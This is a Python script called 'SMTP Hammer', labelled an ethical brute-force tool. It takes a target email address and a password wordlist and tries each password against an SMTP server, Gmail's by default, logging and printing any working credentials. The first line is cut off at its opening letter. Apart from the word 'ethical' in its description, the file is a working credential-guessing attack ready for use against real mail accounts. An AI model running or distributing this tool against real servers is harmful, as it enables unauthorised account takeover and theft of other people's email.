mport smtplib
import logging
import argparse
from typing import List
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Set up logging
logging.basicConfig(
    filename='logs/smtp_hammer.log',
    filemode='a',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def load_passwords(filepath: str) -> List[str]:
    """Load passwords from a file, skipping blank lines."""
    try:
        with open(filepath, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        logging.error(f"Password file not found: {filepath}")
        print(f"{Fore.YELLOW}[!] Password file not found: {filepath}")
        return []

def attempt_login(smtp_server: str, port: int, email: str, passwords: List[str]) -> str:
    """Attempt to log into the SMTP server with each password."""
    for password in passwords:
        try:
            server = smtplib.SMTP(smtp_server, port)
            server.starttls()
            server.login(email, password)
            logging.info(f"Success: {email}:{password}")
            print(f"{Fore.GREEN}[+] Success: {email}:{password}")
            server.quit()
            return password
        except smtplib.SMTPAuthenticationError:
            logging.warning(f"Failed: {email}:{password}")
            print(f"{Fore.RED}[-] Failed: {email}:{password}")
        except Exception as e:
            logging.error(f"Error with {email}:{password} - {str(e)}")
            print(f"{Fore.YELLOW}[!] Error: {str(e)}")
    return ""

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SMTP Hammer — Ethical SMTP Brute Force Tool")
    parser.add_argument("-e", "--email", required=True, help="Target email address")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist file")
    parser.add_argument("-s", "--server", default="smtp.gmail.com", help="SMTP server address (default: smtp.gmail.com)")
    parser.add_argument("-p", "--port", type=int, default=587, help="SMTP server port (default: 587)")

    args = parser.parse_args()

    passwords = load_passwords(args.wordlist)
    if not passwords:
        print(f"{Fore.YELLOW}[!] No passwords loaded. Exiting.")
        exit()

    logging.info(f"Starting brute force on {args.email} with {len(passwords)} passwords.")
    result = attempt_login(args.server, args.port, args.email, passwords)

    if result:
        print(f"{Fore.GREEN}[+] Password found: {result}")
    else:
        print(f"{Fore.RED}[-] No valid password found.")
